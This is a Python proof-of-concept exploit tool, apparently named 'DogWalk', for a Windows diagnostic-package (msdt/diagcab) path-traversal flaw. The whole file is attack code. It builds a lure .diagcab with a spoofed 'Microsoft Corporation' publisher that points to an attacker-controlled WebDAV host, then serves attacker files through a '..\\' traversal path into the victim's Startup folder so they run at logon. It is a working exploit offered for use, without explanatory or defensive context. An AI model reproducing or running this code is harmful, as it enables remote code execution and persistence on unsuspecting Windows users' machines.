import argparse
import os
import re
import socket
import sys

from cabarchive import CabArchive, CabFile
from time import gmtime, strftime
from pathlib import *

DEFAULT_MAL_PATH = "..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
FAKE_FILE = 1
REAL_FILE = 2

class DogWalk:
    def __init__(self):
        self.cabname = "good-news-everybody.diagcab"
        self.mal_path = DEFAULT_MAL_PATH
        self.read_args()
        self.files = (x for x in Path(self.path).iterdir() if x.is_file())
        self.fs = {}
        self.fs["config"] = {}
        self.fs["package"] = {}

        self.make_diagcab()
        self.build_file_structure()

    def read_args(self):
        parser = argparse.ArgumentParser(prog="dogwalk")
        parser.add_argument("-c", "--cabname", help="Name of diagcab to host")
        parser.add_argument("-i", "--inject-path", help="Relative path where the downloaded files by msdt will be stored")
        parser.add_argument("lhost", help="IP Address which msdt connects to")
        parser.add_argument("lport", type=int, help="Port which msdt connects to")
        parser.add_argument("path", help="Path where malicious files are hosted")
        args = parser.parse_args()

        self.lhost = args.lhost
        self.lport = args.lport
        self.path = args.path 

        if args.cabname:
            self.cabname = f"{args.cabname}.diagcab"

        if args.inject_path:
            self.mal_path = args.inject_path

    def make_diagcab(self):
        xml_contents = f"""<?xml version="1.0" encoding="utf-8"?>
<PackageConfiguration xmlns="http://www.microsoft.com/schemas/dcm/configuration/2008">
  <Execution>
    <Package Path="\\{self.lhost}@{self.lport}\DavWWWRoot\package" />
    <Name>Some name</Name>
    <Description>Some description</Description>
    <Icon>@%windir%\diagnostics\system\WindowsUpdate\DiagPackage.dll,-1001</Icon>
  </Execution>

  <Index>
    <Id>Custom</Id>
    <RequiresAdminPrivileges>false</RequiresAdminPrivileges>
    <PrivacyUrl>http://go.microsoft.com/fwlink/?LinkId=190175</PrivacyUrl>
    <Version>1.0</Version>
    <PublisherName>Microsoft Corporation</PublisherName>
    <Category>@%windir%\system32\DiagCpl.dll,-412</Category>
    <Keyword>@%windir%\system32\DiagCpl.dll,-27</Keyword>
  </Index>
</PackageConfiguration>"""
        arc = CabArchive()
        arc["Custom.diagcfg"] = CabFile(xml_contents.encode())
        self.diagcab = arc.save()
        self.fs["config"][self.cabname] = (FAKE_FILE, len(self.diagcab), None)

    def build_file_structure(self):
        for file in self.files:
            filesize = os.stat(str(file)).st_size
            self.fs["package"][f"{self.mal_path}{file.name}"] = (REAL_FILE,filesize,file)
        print(self.fs)

    def gettimestr(self):
        return strftime("%a, %d %b %Y %H:%M:%S GMT", gmtime())

    def reply_207(self, data):
        resp  = "HTTP/1.1 207 Multi-Status\r\n"
        resp += "Date: " + self.gettimestr() + "\r\n"
        resp += "Server: dogwalk\r\n"
        resp += "Content-Length: " + str(len(data)) + "\r\n"
        resp += "Content-Type: text/xml; charset=\"utf-8\"\r\n\r\n"
        
        return (resp + data).encode()

    def reply_404(self):
        resp  = "HTTP/1.1 404 Not-Found\r\n"
        resp += "Date: " + self.gettimestr() + "\r\n"
        resp += "Server: dogwalk\r\n\r\n"

        return resp.encode()

    def handle_options(self):
        resp  = "HTTP/1.1 200 OK\r\n"
        resp += "Date: " + self.gettimestr() + "\r\n"
        resp += "Server: dogwalk\r\n"
        resp += "DAV: 1,2\r\n"
        resp += "DAV: <http://apache.org/dav/propset/fs/1>\r\n"
        resp += "MS-Author-Via: DAV\r\n"
        resp += "Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK\r\n"
        resp += "Content-Length: 0\r\n"
        resp += "Keep-Alive: timeout=15, max 200\r\n"
        resp += "Connection: Keep-Alive\r\n\r\n"

        return resp.encode()

    def handle_get(self, dirname, filename):
        if self.fs.get(dirname):
            d = self.fs[dirname]
            if d.get(filename):
                (is_real, size, f) = d[filename]
                if is_real == REAL_FILE:
                    with open(str(f), "rb") as fh:
                        data = f.read()
                        size = len(data)
                else:
                    data = self.diagcab
                
                resp  = "HTTP/1.1 200 OK\r\n"
                resp += "Date: " + self.gettimestr() + "\r\n"
                resp += "Server: dogwalk\r\n"
                resp += f"Content-Length: {size}\r\n"
                resp += "Content-Type: application/octet-stream\r\n\r\n"

                return resp.encode() + data

            else:
                return self.reply_404()
        else:
            return self.reply_404()        

    
    def dir_entry(self, dirname):
        return f"""<D:response xmlns:lp1="DAV:">
   <D:href>/{dirname}</D:href>
   <D:propstat>
      <D:prop>
        <lp1:resourcetype><D:collection/></lp1:resourcetype>
        <lp1:getlastmodified>{self.gettimestr()}</lp1:getlastmodified>
        <lp1:creationdate>{self.gettimestr()}</lp1:creationdate>
      </D:prop>
   </D:propstat>
</D:response>"""

    def file_entry(self, dirname, filename, flen):
        return f"""<D:response xmlns:lp1="DAV:">
   <D:href>/{dirname}/{filename}</D:href>
   <D:propstat>
      <D:prop>
        <lp1:resourcetype/><lp1:getcontentlength>{str(flen)}</lp1:getcontentlength>
        <lp1:getlastmodified>{self.gettimestr()}</lp1:getlastmodified>
        <lp1:creationdate>{self.gettimestr()}</lp1:creationdate>
      </D:prop>
   </D:propstat>
</D:response>"""


    def handle_dir_propfind(self, dirname, depth):
        header = f"""<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:ns0="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/" xmlns:g0="DAV:">
<D:href>{dirname}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:getlastmodified>{self.gettimestr()}</lp1:getlastmodified>
<lp1:creationdate>{self.gettimestr()}</lp1:creationdate>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>"""
        footer = "</D:multistatus>"

        resp = ""

        if depth == 0:
            resp = header + footer
        elif dirname == '/':
            resp = header + self.dir_entry("config") + self.dir_entry("package") + footer
        else:
            d = dirname.split('/')[1]
            resp = header
            for file in self.fs[d]:
                fi = self.fs[d][file]
                resp = resp + self.file_entry(d, file, fi[1])
            resp = resp + footer

        return self.reply_207(resp)


    def handle_file_propfind(self, directory, file):
        header = """<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:ns0="DAV:">"""
        footer = "</D:multistatus>"

        if self.fs.get(directory):
            if self.fs[directory].get(file):
                resp = header + self.file_entry(directory, file, self.fs[directory][file][1]) + footer
                return self.reply_207(resp)
            else:
                return self.reply_404()
        else:
            return self.reply_404()


    def handle_web(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", self.lport))
        s.listen(5)
        sys.stderr.write(f"Serving on 0.0.0.0:{self.lport}\n")
        while True:
            (cs,addr) = s.accept()
            sys.stderr.write(f"Got connection from {addr[0]}:{addr[1]}\n")

            data = cs.recv(1024)
            resp = ""

            if data.startswith(b"OPTIONS "):
                sys.stderr.write(f"Handling OPTIONS\n")
                resp = self.handle_options()
            elif data.startswith(b"GET "):
                path = re.match(b"GET /([^/]+)/([^/]+) HTTP", data)
                if path:
                    directory = path.group(1).decode()
                    filename = path.group(2).decode()
                    sys.stderr.write(f"Handling GET - {directory}/{filename}\n")
                    resp = self.handle_get(directory, filename)
            elif data.startswith(b"PROPFIND "):
                sys.stderr.write("Handling PROPFIND\n")
                path = re.match(b"PROPFIND /([^/]+)/([^/]+) HTTP.*", data)
                if path:
                   directory = path.group(1).decode()
                   filename = path.group(2).decode()
                   resp = self.handle_file_propfind(directory, filename) 
                else:
                    directory = re.match(b"PROPFIND (/.*)/? HTTP.*", data)
                    if directory:
                        directory = directory.group(1).decode()
                        depth = re.search(b"Depth: ([0-9]+)", data)
                        if (depth):
                            depth = int(depth.group(1).decode())
                            resp = self.handle_dir_propfind(directory, depth)
            else:
                sys.stderr.write(f"Unhandled VERB - {data.split(b' ')[0].decode()}\n")

            if len(resp) > 0:
                cs.send(resp)

            cs.close()


def main():
    d = DogWalk()
    d.handle_web()

if __name__ == "__main__":
    main()